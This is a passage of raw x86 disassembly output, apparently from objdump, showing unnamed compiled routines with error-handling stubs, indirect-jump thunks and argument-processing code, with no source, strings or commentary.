  403744:	e8 c7 e6 ff ff       	call   0x401e10
  403749:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40374e:	e9 36 fc ff ff       	jmp    0x403389
  403753:	c7 04 24 a4 ca 40 00 	movl   $0x40caa4,(%esp)
  40375a:	e8 b1 e6 ff ff       	call   0x401e10
  40375f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403764:	e9 20 fc ff ff       	jmp    0x403389
  403769:	c7 04 24 d8 ca 40 00 	movl   $0x40cad8,(%esp)
  403770:	e8 9b e6 ff ff       	call   0x401e10
  403775:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40377a:	e9 0a fc ff ff       	jmp    0x403389
  40377f:	c7 04 24 14 cb 40 00 	movl   $0x40cb14,(%esp)
  403786:	e8 85 e6 ff ff       	call   0x401e10
  40378b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403790:	e9 f4 fb ff ff       	jmp    0x403389
  403795:	c7 04 24 58 cb 40 00 	movl   $0x40cb58,(%esp)
  40379c:	e8 6f e6 ff ff       	call   0x401e10
  4037a1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4037a6:	e9 de fb ff ff       	jmp    0x403389
  4037ab:	c7 04 24 a0 cb 40 00 	movl   $0x40cba0,(%esp)
  4037b2:	e8 59 e6 ff ff       	call   0x401e10
  4037b7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4037bc:	e9 c8 fb ff ff       	jmp    0x403389
  4037c1:	c7 04 24 b4 cc 40 00 	movl   $0x40ccb4,(%esp)
  4037c8:	e8 43 e6 ff ff       	call   0x401e10
  4037cd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4037d2:	e9 b2 fb ff ff       	jmp    0x403389
  4037d7:	c7 04 24 f4 cc 40 00 	movl   $0x40ccf4,(%esp)
  4037de:	e8 2d e6 ff ff       	call   0x401e10
  4037e3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4037e8:	e9 9c fb ff ff       	jmp    0x403389
  4037ed:	c7 04 24 30 cd 40 00 	movl   $0x40cd30,(%esp)
  4037f4:	e8 17 e6 ff ff       	call   0x401e10
  4037f9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4037fe:	e9 86 fb ff ff       	jmp    0x403389
  403803:	c7 04 24 6c cd 40 00 	movl   $0x40cd6c,(%esp)
  40380a:	e8 01 e6 ff ff       	call   0x401e10
  40380f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403814:	e9 70 fb ff ff       	jmp    0x403389
  403819:	c7 04 24 a8 cd 40 00 	movl   $0x40cda8,(%esp)
  403820:	e8 eb e5 ff ff       	call   0x401e10
  403825:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40382a:	e9 5a fb ff ff       	jmp    0x403389
  40382f:	c7 04 24 2c cc 40 00 	movl   $0x40cc2c,(%esp)
  403836:	e8 d5 e5 ff ff       	call   0x401e10
  40383b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403840:	e9 44 fb ff ff       	jmp    0x403389
  403845:	c7 04 24 f4 c6 40 00 	movl   $0x40c6f4,(%esp)
  40384c:	e8 bf e5 ff ff       	call   0x401e10
  403851:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403856:	e9 2e fb ff ff       	jmp    0x403389
  40385b:	c7 04 24 e8 cb 40 00 	movl   $0x40cbe8,(%esp)
  403862:	e8 a9 e5 ff ff       	call   0x401e10
  403867:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40386c:	e9 18 fb ff ff       	jmp    0x403389
  403871:	c7 04 24 e4 cd 40 00 	movl   $0x40cde4,(%esp)
  403878:	e8 93 e5 ff ff       	call   0x401e10
  40387d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403882:	e9 02 fb ff ff       	jmp    0x403389
  403887:	c7 04 24 d0 ce 40 00 	movl   $0x40ced0,(%esp)
  40388e:	e8 7d e5 ff ff       	call   0x401e10
  403893:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403898:	e9 ec fa ff ff       	jmp    0x403389
  40389d:	c7 04 24 28 ce 40 00 	movl   $0x40ce28,(%esp)
  4038a4:	e8 67 e5 ff ff       	call   0x401e10
  4038a9:	83 c8 ff             	or     $0xffffffff,%eax
  4038ac:	e9 d8 fa ff ff       	jmp    0x403389
  4038b1:	c7 04 24 14 cf 40 00 	movl   $0x40cf14,(%esp)
  4038b8:	e8 53 e5 ff ff       	call   0x401e10
  4038bd:	83 c8 ff             	or     $0xffffffff,%eax
  4038c0:	e9 c4 fa ff ff       	jmp    0x403389
  4038c5:	c7 04 24 a4 ce 40 00 	movl   $0x40cea4,(%esp)
  4038cc:	e8 3f e5 ff ff       	call   0x401e10
  4038d1:	83 c8 ff             	or     $0xffffffff,%eax
  4038d4:	e9 b0 fa ff ff       	jmp    0x403389
  4038d9:	90                   	nop
  4038da:	90                   	nop
  4038db:	90                   	nop
  4038dc:	90                   	nop
  4038dd:	90                   	nop
  4038de:	90                   	nop
  4038df:	90                   	nop
  4038e0:	a1 98 20 41 00       	mov    0x412098,%eax
  4038e5:	ff e0                	jmp    *%eax
  4038e7:	89 f6                	mov    %esi,%esi
  4038e9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4038f0:	a1 9c 20 41 00       	mov    0x41209c,%eax
  4038f5:	ff e0                	jmp    *%eax
  4038f7:	89 f6                	mov    %esi,%esi
  4038f9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  403900:	a1 3c 20 41 00       	mov    0x41203c,%eax
  403905:	ff e0                	jmp    *%eax
  403907:	89 f6                	mov    %esi,%esi
  403909:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  403910:	a1 48 20 41 00       	mov    0x412048,%eax
  403915:	ff e0                	jmp    *%eax
  403917:	89 f6                	mov    %esi,%esi
  403919:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  403920:	a1 4c 20 41 00       	mov    0x41204c,%eax
  403925:	ff e0                	jmp    *%eax
  403927:	90                   	nop
  403928:	90                   	nop
  403929:	90                   	nop
  40392a:	90                   	nop
  40392b:	90                   	nop
  40392c:	90                   	nop
  40392d:	90                   	nop
  40392e:	90                   	nop
  40392f:	90                   	nop
  403930:	55                   	push   %ebp
  403931:	57                   	push   %edi
  403932:	56                   	push   %esi
  403933:	53                   	push   %ebx
  403934:	50                   	push   %eax
  403935:	b8 38 20 00 00       	mov    $0x2038,%eax
  40393a:	e8 a1 6c 00 00       	call   0x40a5e0
  40393f:	29 c4                	sub    %eax,%esp
  403941:	8b 04 04             	mov    (%esp,%eax,1),%eax
  403944:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40394b:	00 
  40394c:	89 c5                	mov    %eax,%ebp
  40394e:	8b 58 08             	mov    0x8(%eax),%ebx
  403951:	a1 cc 20 41 00       	mov    0x4120cc,%eax
  403956:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  403959:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  40395f:	a1 d4 20 41 00       	mov    0x4120d4,%eax
  403964:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  40396a:	a1 dc 20 41 00       	mov    0x4120dc,%eax
  40396f:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403975:	a1 c8 20 41 00       	mov    0x4120c8,%eax
  40397a:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403980:	a1 d0 20 41 00       	mov    0x4120d0,%eax
  403985:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  40398b:	a1 c0 20 41 00       	mov    0x4120c0,%eax
  403990:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403996:	72 2e                	jb     0x4039c6
  403998:	e9 41 01 00 00       	jmp    0x403ade
  40399d:	8d 76 00             	lea    0x0(%esi),%esi
  4039a0:	3c 75                	cmp    $0x75,%al
  4039a2:	74 5c                	je     0x403a00
  4039a4:	3c 76                	cmp    $0x76,%al
  4039a6:	75 0b                	jne    0x4039b3
  4039a8:	a1 c0 20 41 00       	mov    0x4120c0,%eax
  4039ad:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  4039b3:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4039b7:	89 2c 24             	mov    %ebp,(%esp)
  4039ba:	e8 11 dc ff ff       	call   0x4015d0
  4039bf:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4039c2:	89 c3                	mov    %eax,%ebx
  4039c4:	76 6a                	jbe    0x403a30
  4039c6:	80 7b 11 6f          	cmpb   $0x6f,0x11(%ebx)
  4039ca:	75 e7                	jne    0x4039b3
  4039cc:	8d 73 12             	lea    0x12(%ebx),%esi
  4039cf:	bf a8 cf 40 00       	mov    $0x40cfa8,%edi
  4039d4:	b9 04 00 00 00       	mov    $0x4,%ecx
  4039d9:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4039db:	74 d6                	je     0x4039b3
  4039dd:	0f b6 43 12          	movzbl 0x12(%ebx),%eax
  4039e1:	3c 57                	cmp    $0x57,%al
  4039e3:	74 2b                	je     0x403a10
  4039e5:	7f b9                	jg     0x4039a0
  4039e7:	3c 4f                	cmp    $0x4f,%al
  4039e9:	75 c8                	jne    0x4039b3
  4039eb:	a1 c4 20 41 00       	mov    0x4120c4,%eax
  4039f0:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  4039f6:	eb bb                	jmp    0x4039b3
  4039f8:	90                   	nop
  4039f9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403a00:	c7 44 24 1c 01 00 00 	movl   $0x1,0x1c(%esp)
  403a07:	00 
  403a08:	eb a9                	jmp    0x4039b3
  403a0a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  403a10:	8b 15 74 e6 41 00    	mov    0x41e674,%edx
  403a16:	85 d2                	test   %edx,%edx
  403a18:	0f 84 d2 00 00 00    	je     0x403af0
  403a1e:	8d 43 14             	lea    0x14(%ebx),%eax
  403a21:	89 04 24             	mov    %eax,(%esp)
  403a24:	e8 f7 fe ff ff       	call   0x403920
  403a29:	eb 88                	jmp    0x4039b3
  403a2b:	90                   	nop
  403a2c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403a30:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403a34:	85 c0                	test   %eax,%eax
  403a36:	0f 84 a2 00 00 00    	je     0x403ade
  403a3c:	a1 00 f3 41 00       	mov    0x41f300,%eax
  403a41:	89 04 24             	mov    %eax,(%esp)
  403a44:	e8 df 6e 00 00       	call   0x40a928
  403a49:	8b 1d 18 f3 41 00    	mov    0x41f318,%ebx
  403a4f:	c7 44 24 04 00 80 00 	movl   $0x8000,0x4(%esp)
  403a56:	00 
  403a57:	89 04 24             	mov    %eax,(%esp)
  403a5a:	ff d3                	call   *%ebx
  403a5c:	a1 00 f3 41 00       	mov    0x41f300,%eax
  403a61:	83 c0 20             	add    $0x20,%eax
  403a64:	89 04 24             	mov    %eax,(%esp)
  403a67:	e8 bc 6e 00 00       	call   0x40a928
  403a6c:	c7 44 24 04 00 80 00 	movl   $0x8000,0x4(%esp)
  403a73:	00 
  403a74:	89 04 24             	mov    %eax,(%esp)
  403a77:	ff d3                	call   *%ebx
  403a79:	a1 00 f3 41 00       	mov    0x41f300,%eax
  403a7e:	83 c0 20             	add    $0x20,%eax
  403a81:	89 04 24             	mov    %eax,(%esp)
  403a84:	e8 a7 6e 00 00       	call   0x40a930
  403a89:	a1 00 f3 41 00       	mov    0x41f300,%eax
  403a8e:	83 c0 40             	add    $0x40,%eax
  403a91:	89 04 24             	mov    %eax,(%esp)
  403a94:	e8 97 6e 00 00       	call   0x40a930
  403a99:	a1 00 f3 41 00       	mov    0x41f300,%eax
  403a9e:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403aa5:	00 
  403aa6:	89 04 24             	mov    %eax,(%esp)
  403aa9:	e8 8a 6e 00 00       	call   0x40a938
  403aae:	a1 00 f3 41 00       	mov    0x41f300,%eax
  403ab3:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403aba:	00 
  403abb:	83 c0 20             	add    $0x20,%eax
  403abe:	89 04 24             	mov    %eax,(%esp)
  403ac1:	e8 72 6e 00 00       	call   0x40a938
  403ac6:	a1 00 f3 41 00       	mov    0x41f300,%eax
  403acb:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403ad2:	00 
  403ad3:	83 c0 40             	add    $0x40,%eax
  403ad6:	89 04 24             	mov    %eax,(%esp)
  403ad9:	e8 5a 6e 00 00       	call   0x40a938
  403ade:	31 c0                	xor    %eax,%eax
  403ae0:	81 c4 3c 20 00 00    	add    $0x203c,%esp
  403ae6:	5b                   	pop    %ebx
  403ae7:	5e                   	pop    %esi
  403ae8:	5f                   	pop    %edi
  403ae9:	5d                   	pop    %ebp
  403aea:	c3                   	ret
  403aeb:	90                   	nop
  403aec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403af0:	8d 44 24 2e          	lea    0x2e(%esp),%eax
  403af4:	8d 73 14             	lea    0x14(%ebx),%esi
  403af7:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  403afe:	00 
  403aff:	89 74 24 04          	mov    %esi,0x4(%esp)
  403b03:	89 04 24             	mov    %eax,(%esp)
  403b06:	e8 35 6e 00 00       	call   0x40a940
  403b0b:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b0e:	74 12                	je     0x403b22
  403b10:	8d 44 24 2e          	lea    0x2e(%esp),%eax
  403b14:	89 04 24             	mov    %eax,(%esp)
  403b17:	ff 15 4c 20 41 00    	call   *0x41204c
  403b1d:	e9 91 fe ff ff       	jmp    0x4039b3
  403b22:	89 74 24 04          	mov    %esi,0x4(%esp)
  403b26:	c7 04 24 b0 cf 40 00 	movl   $0x40cfb0,(%esp)
  403b2d:	e8 de e2 ff ff       	call   0x401e10
  403b32:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403b37:	eb a7                	jmp    0x403ae0
  403b39:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403b40:	57                   	push   %edi
  403b41:	56                   	push   %esi
  403b42:	b8 50 10 00 00       	mov    $0x1050,%eax
  403b47:	53                   	push   %ebx
  403b48:	e8 93 6a 00 00       	call   0x40a5e0
  403b4d:	29 c4                	sub    %eax,%esp
  403b4f:	8b 9c 24 60 10 00 00 	mov    0x1060(%esp),%ebx
  403b56:	8b 43 24             	mov    0x24(%ebx),%eax
  403b59:	89 04 24             	mov    %eax,(%esp)
  403b5c:	ff 15 d4 f3 41 00    	call   *0x41f3d4
  403b62:	89 c7                	mov    %eax,%edi
  403b64:	8d 40 ec             	lea    -0x14(%eax),%eax
  403b67:	83 ec 04             	sub    $0x4,%esp
  403b6a:	8d 74 24 10          	lea    0x10(%esp),%esi
  403b6e:	83 f8 09             	cmp    $0x9,%eax
  403b71:	0f 96 c0             	setbe  %al
  403b74:	89 34 24             	mov    %esi,(%esp)
  403b77:	0f b6 c0             	movzbl %al,%eax
  403b7a:	a3 74 e6 41 00       	mov    %eax,0x41e674
  403b7f:	8d 43 28             	lea    0x28(%ebx),%eax
  403b82:	81 c3 68 30 00 00    	add    $0x3068,%ebx
  403b88:	89 44 24 04          	mov    %eax,0x4(%esp)
  403b8c:	e8 27 6d 00 00       	call   0x40a8b8
  403b91:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  403b95:	8d 5c 24 50          	lea    0x50(%esp),%ebx
  403b99:	89 74 24 08          	mov    %esi,0x8(%esp)
  403b9d:	89 1c 24             	mov    %ebx,(%esp)
  403ba0:	e8 bb ef ff ff       	call   0x402b60
  403ba5:	89 1c 24             	mov    %ebx,(%esp)
  403ba8:	e8 63 10 00 00       	call   0x404c10
  403bad:	85 c0                	test   %eax,%eax
  403baf:	74 16                	je     0x403bc7
  403bb1:	89 7c 24 04          	mov    %edi,0x4(%esp)
  403bb5:	89 04 24             	mov    %eax,(%esp)
  403bb8:	e8 13 f3 ff ff       	call   0x402ed0
  403bbd:	81 c4 50 10 00 00    	add    $0x1050,%esp
  403bc3:	5b                   	pop    %ebx
  403bc4:	5e                   	pop    %esi
  403bc5:	5f                   	pop    %edi
  403bc6:	c3                   	ret
  403bc7:	ff 15 4c f2 41 00    	call   *0x41f24c
  403bcd:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  403bd1:	89 44 24 08          	mov    %eax,0x8(%esp)
  403bd5:	c7 04 24 f8 cf 40 00 	movl   $0x40cff8,(%esp)
  403bdc:	e8 2f e2 ff ff       	call   0x401e10
  403be1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403be6:	eb d5                	jmp    0x403bbd
  403be8:	90                   	nop
  403be9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403bf0:	57                   	push   %edi
  403bf1:	56                   	push   %esi
  403bf2:	b8 20 10 00 00       	mov    $0x1020,%eax
  403bf7:	53                   	push   %ebx
  403bf8:	e8 e3 69 00 00       	call   0x40a5e0
  403bfd:	29 c4                	sub    %eax,%esp
  403bff:	8b bc 24 30 10 00 00 	mov    0x1030(%esp),%edi
  403c06:	8b 47 24             	mov    0x24(%edi),%eax
  403c09:	89 04 24             	mov    %eax,(%esp)
  403c0c:	ff 15 d4 f3 41 00    	call   *0x41f3d4
  403c12:	83 ec 04             	sub    $0x4,%esp
  403c15:	89 c6                	mov    %eax,%esi
  403c17:	8d 5c 24 1f          	lea    0x1f(%esp),%ebx
  403c1b:	89 44 24 08          	mov    %eax,0x8(%esp)
  403c1f:	c7 44 24 04 26 d0 40 	movl   $0x40d026,0x4(%esp)
  403c26:	00 
  403c27:	89 1c 24             	mov    %ebx,(%esp)
  403c2a:	e8 19 6d 00 00       	call   0x40a948
  403c2f:	89 1c 24             	mov    %ebx,(%esp)
  403c32:	ff 15 54 f2 41 00    	call   *0x41f254
  403c38:	83 ec 04             	sub    $0x4,%esp
  403c3b:	85 c0                	test   %eax,%eax
  403c3d:	74 23                	je     0x403c62
  403c3f:	89 74 24 04          	mov    %esi,0x4(%esp)
  403c43:	89 04 24             	mov    %eax,(%esp)
  403c46:	e8 85 f2 ff ff       	call   0x402ed0
  403c4b:	8b 94 24 34 10 00 00 	mov    0x1034(%esp),%edx
  403c52:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  403c58:	81 c4 20 10 00 00    	add    $0x1020,%esp
  403c5e:	5b                   	pop    %ebx
  403c5f:	5e                   	pop    %esi
  403c60:	5f                   	pop    %edi
  403c61:	c3                   	ret
  403c62:	8b 84 24 34 10 00 00 	mov    0x1034(%esp),%eax
  403c69:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403c6f:	89 3c 24             	mov    %edi,(%esp)
  403c72:	e8 c9 fe ff ff       	call   0x403b40
  403c77:	81 c4 20 10 00 00    	add    $0x1020,%esp
  403c7d:	5b                   	pop    %ebx
  403c7e:	5e                   	pop    %esi
  403c7f:	5f                   	pop    %edi
  403c80:	c3                   	ret
  403c81:	eb 0d                	jmp    0x403c90
  403c83:	90                   	nop
  403c84:	90                   	nop
  403c85:	90                   	nop
  403c86:	90                   	nop
  403c87:	90                   	nop
  403c88:	90                   	nop
  403c89:	90                   	nop
  403c8a:	90                   	nop
  403c8b:	90                   	nop
  403c8c:	90                   	nop
  403c8d:	90                   	nop
  403c8e:	90                   	nop
  403c8f:	90                   	nop
  403c90:	55                   	push   %ebp
  403c91:	57                   	push   %edi
  403c92:	56                   	push   %esi
  403c93:	53                   	push   %ebx
  403c94:	83 ec 2c             	sub    $0x2c,%esp
  403c97:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403c9e:	00 
  403c9f:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  403ca6:	8b 74 24 40          	mov    0x40(%esp),%esi
  403caa:	8b 7c 24 44          	mov    0x44(%esp),%edi
  403cae:	e8 9d 6c 00 00       	call   0x40a950
  403cb3:	89 04 24             	mov    %eax,(%esp)
  403cb6:	e8 9d 6c 00 00       	call   0x40a958
  403cbb:	85 c0                	test   %eax,%eax
  403cbd:	89 44 24 18          	mov    %eax,0x18(%esp)
  403cc1:	0f 84 bb 00 00 00    	je     0x403d82
  403cc7:	8d 04 b5 04 00 00 00 	lea    0x4(,%esi,4),%eax
  403cce:	89 04 24             	mov    %eax,(%esp)
  403cd1:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403cd5:	e8 76 6b 00 00       	call   0x40a850
  403cda:	85 c0                	test   %eax,%eax
  403cdc:	89 c3                	mov    %eax,%ebx
  403cde:	0f 84 9e 00 00 00    	je     0x403d82
  403ce4:	c7 44 24 04 44 d0 40 	movl   $0x40d044,0x4(%esp)
  403ceb:	00 
  403cec:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  403cf3:	31 ed                	xor    %ebp,%ebp
  403cf5:	e8 56 6c 00 00       	call   0x40a950
  403cfa:	85 f6                	test   %esi,%esi
  403cfc:	7f 09                	jg     0x403d07
  403cfe:	eb 50                	jmp    0x403d50
  403d00:	83 c5 01             	add    $0x1,%ebp
  403d03:	39 f5                	cmp    %esi,%ebp
  403d05:	74 49                	je     0x403d50
  403d07:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403d0e:	00 
  403d0f:	8b 04 af             	mov    (%edi,%ebp,4),%eax
  403d12:	89 04 24             	mov    %eax,(%esp)
  403d15:	ff 15 30 20 41 00    	call   *0x412030
  403d1b:	85 c0                	test   %eax,%eax
  403d1d:	89 04 ab             	mov    %eax,(%ebx,%ebp,4)
  403d20:	75 de                	jne    0x403d00
  403d22:	8b 44 24 18          	mov    0x18(%esp),%eax
  403d26:	89 04 24             	mov    %eax,(%esp)
  403d29:	e8 6a 6b 00 00       	call   0x40a898
  403d2e:	8d 55 01             	lea    0x1(%ebp),%edx
  403d31:	c7 04 24 48 d0 40 00 	movl   $0x40d048,(%esp)
  403d38:	89 54 24 04          	mov    %edx,0x4(%esp)
  403d3c:	e8 cf e0 ff ff       	call   0x401e10
  403d41:	31 c0                	xor    %eax,%eax
  403d43:	83 c4 2c             	add    $0x2c,%esp
  403d46:	5b                   	pop    %ebx
  403d47:	5e                   	pop    %esi
  403d48:	5f                   	pop    %edi
  403d49:	5d                   	pop    %ebp
  403d4a:	c3                   	ret
  403d4b:	90                   	nop
  403d4c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403d50:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403d54:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403d58:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  403d5f:	89 7c 24 04          	mov    %edi,0x4(%esp)
  403d63:	c7 44 03 fc 00 00 00 	movl   $0x0,-0x4(%ebx,%eax,1)
  403d6a:	00 
  403d6b:	e8 e0 6b 00 00       	call   0x40a950
  403d70:	89 3c 24             	mov    %edi,(%esp)
  403d73:	e8 20 6b 00 00       	call   0x40a898
  403d78:	83 c4 2c             	add    $0x2c,%esp
  403d7b:	89 d8                	mov    %ebx,%eax
  403d7d:	5b                   	pop    %ebx
  403d7e:	5e                   	pop    %esi
  403d7f:	5f                   	pop    %edi
  403d80:	5d                   	pop    %ebp
  403d81:	c3                   	ret
  403d82:	c7 04 24 35 d0 40 00 	movl   $0x40d035,(%esp)
  403d89:	e8 82 e0 ff ff       	call   0x401e10
  403d8e:	31 c0                	xor    %eax,%eax
  403d90:	eb b1                	jmp    0x403d43
  403d92:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403d99:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  403da0:	56                   	push   %esi
  403da1:	53                   	push   %ebx
  403da2:	83 ec 14             	sub    $0x14,%esp
  403da5:	8b 74 24 20          	mov    0x20(%esp),%esi
  403da9:	8b 06                	mov    (%esi),%eax
  403dab:	89 f3                	mov    %esi,%ebx
  403dad:	85 c0                	test   %eax,%eax
  403daf:	74 11                	je     0x403dc2
  403db1:	89 04 24             	mov    %eax,(%esp)
  403db4:	83 c3 04             	add    $0x4,%ebx
  403db7:	e8 dc 6a 00 00       	call   0x40a898
  403dbc:	8b 03                	mov    (%ebx),%eax
  403dbe:	85 c0                	test   %eax,%eax
  403dc0:	75 ef                	jne    0x403db1
  403dc2:	89 74 24 20          	mov    %esi,0x20(%esp)
  403dc6:	83 c4 14             	add    $0x14,%esp
  403dc9:	5b                   	pop    %ebx
  403dca:	5e                   	pop    %esi
  403dcb:	e9 c8 6a 00 00       	jmp    0x40a898
  403dd0:	e9 3b 14 00 00       	jmp    0x405210
  403dd5:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403dd9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  403de0:	56                   	push   %esi
  403de1:	53                   	push   %ebx
  403de2:	83 ec 14             	sub    $0x14,%esp
  403de5:	a1 74 e6 41 00       	mov    0x41e674,%eax
  403dea:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  403dee:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  403df5:	00 
  403df6:	85 c0                	test   %eax,%eax
  403df8:	8d 43 68             	lea    0x68(%ebx),%eax
  403dfb:	89 44 24 04          	mov    %eax,0x4(%esp)
  403dff:	74 22                	je     0x403e23
  403e01:	c7 04 24 80 d2 41 00 	movl   $0x41d280,(%esp)
  403e08:	e8 03 18 00 00       	call   0x405610
  403e0d:	85 c0                	test   %eax,%eax
  403e0f:	0f 84 c3 02 00 00    	je     0x4040d8
  403e15:	c7 04 24 80 d2 41 00 	movl   $0x41d280,(%esp)
  403e1c:	e8 cf fa ff ff       	call   0x4038f0
  403e21:	eb 21                	jmp    0x403e44
  403e23:	c7 04 24 40 b2 41 00 	movl   $0x41b240,(%esp)
  403e2a:	e8 e1 13 00 00       	call   0x405210
  403e2f:	85 c0                	test   %eax,%eax
  403e31:	0f 84 a1 02 00 00    	je     0x4040d8
  403e37:	c7 04 24 40 b2 41 00 	movl   $0x41b240,(%esp)
  403e3e:	ff 15 9c 20 41 00    	call   *0x41209c
  403e44:	a1 74 e6 41 00       	mov    0x41e674,%eax
  403e49:	8d b3 68 30 00 00    	lea    0x3068(%ebx),%esi
  403e4f:	89 34 24             	mov    %esi,(%esp)
  403e52:	85 c0                	test   %eax,%eax
  403e54:	0f 84 f6 00 00 00    	je     0x403f50
  403e5a:	e8 69 6a 00 00       	call   0x40a8c8
  403e5f:	89 74 24 04          	mov    %esi,0x4(%esp)
  403e63:	89 44 24 08          	mov    %eax,0x8(%esp)
  403e67:	c7 04 24 00 92 41 00 	movl   $0x419200,(%esp)
  403e6e:	e8 85 6a 00 00       	call   0x40a8f8
  403e73:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  403e7a:	00 
  403e7b:	89 74 24 04          	mov    %esi,0x4(%esp)
  403e7f:	c7 04 24 80 61 41 00 	movl   $0x416180,(%esp)
  403e86:	e8 85 17 00 00       	call   0x405610
  403e8b:	85 c0                	test   %eax,%eax
  403e8d:	0f 84 a8 02 00 00    	je     0x40413b
  403e93:	c7 04 24 80 61 41 00 	movl   $0x416180,(%esp)
  403e9a:	e8 41 fa ff ff       	call   0x4038e0
  403e9f:	89 d8                	mov    %ebx,%eax
  403ea1:	e8 8a fa ff ff       	call   0x403930
  403ea6:	ff 15 a8 20 41 00    	call   *0x4120a8
  403eac:	8b 0d 74 e6 41 00    	mov    0x41e674,%ecx
  403eb2:	85 c9                	test   %ecx,%ecx
  403eb4:	0f 84 f6 01 00 00    	je     0x4040b0
  403eba:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  403ec1:	00 
  403ec2:	c7 44 24 04 00 92 41 	movl   $0x419200,0x4(%esp)
  403ec9:	00 
  403eca:	c7 04 24 00 21 41 00 	movl   $0x412100,(%esp)
  403ed1:	e8 3a 17 00 00       	call   0x405610
  403ed6:	85 c0                	test   %eax,%eax
  403ed8:	0f 84 12 02 00 00    	je     0x4040f0
  403ede:	c7 04 24 00 21 41 00 	movl   $0x412100,(%esp)
  403ee5:	e8 16 fa ff ff       	call   0x403900
  403eea:	8b 83 74 40 00 00    	mov    0x4074(%ebx),%eax
  403ef0:	8b 15 74 e6 41 00    	mov    0x41e674,%edx
  403ef6:	89 44 24 04          	mov    %eax,0x4(%esp)
  403efa:	8b 83 70 40 00 00    	mov    0x4070(%ebx),%eax
  403f00:	85 d2                	test   %edx,%edx
  403f02:	89 04 24             	mov    %eax,(%esp)
  403f05:	0f 84 65 01 00 00    	je     0x404070
  403f0b:	e8 e0 17 00 00       	call   0x4056f0
  403f10:	85 c0                	test   %eax,%eax
  403f12:	89 c6                	mov    %eax,%esi
  403f14:	0f 84 e7 01 00 00    	je     0x404101
  403f1a:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  403f21:	00 
  403f22:	89 44 24 04          	mov    %eax,0x4(%esp)
  403f26:	8b 83 70 40 00 00    	mov    0x4070(%ebx),%eax
  403f2c:	89 04 24             	mov    %eax,(%esp)
  403f2f:	e8 dc f9 ff ff       	call   0x403910
  403f34:	89 34 24             	mov    %esi,(%esp)
  403f37:	e8 5c 69 00 00       	call   0x40a898
  403f3c:	ff 15 8c 20 41 00    	call   *0x41208c
  403f42:	85 c0                	test   %eax,%eax
  403f44:	0f 85 78 01 00 00    	jne    0x4040c2
  403f4a:	83 c4 14             	add    $0x14,%esp
  403f4d:	5b                   	pop    %ebx
  403f4e:	5e                   	pop    %esi
  403f4f:	c3                   	ret
  403f50:	e8 73 69 00 00       	call   0x40a8c8
